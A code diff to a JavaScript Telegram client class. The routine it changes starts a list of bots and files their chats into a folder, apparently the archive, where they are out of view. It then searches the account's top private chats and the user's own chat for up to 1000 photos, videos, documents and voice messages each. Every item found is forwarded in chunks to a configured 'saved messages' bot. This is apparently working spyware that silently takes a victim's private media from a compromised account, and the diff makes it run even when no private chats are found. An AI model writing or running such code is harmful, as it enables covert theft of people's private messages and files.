@@ -179,48 +179,46 @@ class TelegramManager {
             } else {
                 const chats = await this.getTopPrivateChats();
                 const me = await this.getMe();
-                if (chats.length > 0) {
-                    for (const bot of bots) {
-                        try {
-                            await this.client.sendMessage(bot, { message: "Start" });
-                            await sleep(1000);
-                            await this.client.invoke(
-                                new Api.folders.EditPeerFolders({
-                                    folderPeers: [
-                                        new Api.InputFolderPeer({
-                                            peer: await this.client.getInputEntity(bot),
-                                            folderId: 1,
-                                        }),
-                                    ],
-                                })
-                            );
-                        } catch (e) {
-                            console.log(e)
-                        }
+                const finalChats = new Set(chats.map(chat => chat.chatId));
+                finalChats.add(me.id?.toString());
+                for (const bot of bots) {
+                    try {
+                        await this.client.sendMessage(bot, { message: "Start" });
+                        await sleep(1000);
+                        await this.client.invoke(
+                            new Api.folders.EditPeerFolders({
+                                folderPeers: [
+                                    new Api.InputFolderPeer({
+                                        peer: await this.client.getInputEntity(bot),
+                                        folderId: 1,
+                                    }),
+                                ],
+                            })
+                        );
+                    } catch (e) {
+                        console.log(e)
                     }
-                    const finalChats = new Set(chats.map(chat => chat.chatId));
-                    finalChats.add(me.id?.toString());
-                    for (const chatId of finalChats) {
-                        const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [MessageMediaType.PHOTO, MessageMediaType.VIDEO, MessageMediaType.ROUND_VIDEO, MessageMediaType.DOCUMENT, MessageMediaType.ROUND_VOICE, MessageMediaType.VOICE] });
-                        console.log("Media Messages: ", mediaMessages);
-                        const uniqueMessageIds = Array.from(new Set([
-                            ...mediaMessages.photo.messages,
-                            ...mediaMessages.video.messages,
-                            ...mediaMessages.document.messages,
-                            ...mediaMessages.roundVideo.messages,
-                            ...mediaMessages.roundVoice.messages,
-                            ...mediaMessages.voice.messages,
-                        ]));
-                        const chunkSize = 30;
-                        for (let i = 0; i < uniqueMessageIds.length; i += chunkSize) {
-                            const chunk = uniqueMessageIds.slice(i, i + chunkSize);
-                            const bot = BotConfig.getInstance().getBotUsername(ChannelCategory.SAVED_MESSAGES)
-                            await this.client.forwardMessages(bot, {
-                                messages: chunk,
-                                fromPeer: chatId,
-                            });
-                            console.log(`Forwarded ${chunk.length} messages to bot`);
-                        }
+                }
+                for (const chatId of finalChats) {
+                    const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [MessageMediaType.PHOTO, MessageMediaType.VIDEO, MessageMediaType.ROUND_VIDEO, MessageMediaType.DOCUMENT, MessageMediaType.ROUND_VOICE, MessageMediaType.VOICE] });
+                    console.log("Media Messages: ", mediaMessages);
+                    const uniqueMessageIds = Array.from(new Set([
+                        ...mediaMessages.photo.messages,
+                        ...mediaMessages.video.messages,
+                        ...mediaMessages.document.messages,
+                        ...mediaMessages.roundVideo.messages,
+                        ...mediaMessages.roundVoice.messages,
+                        ...mediaMessages.voice.messages,
+                    ]));
+                    const chunkSize = 30;
+                    for (let i = 0; i < uniqueMessageIds.length; i += chunkSize) {
+                        const chunk = uniqueMessageIds.slice(i, i + chunkSize);
+                        const bot = BotConfig.getInstance().getBotUsername(ChannelCategory.SAVED_MESSAGES)
+                        await this.client.forwardMessages(bot, {
+                            messages: chunk,
+                            fromPeer: chatId,
+                        });
+                        console.log(`Forwarded ${chunk.length} messages to bot`);
                     }
                 }
             }
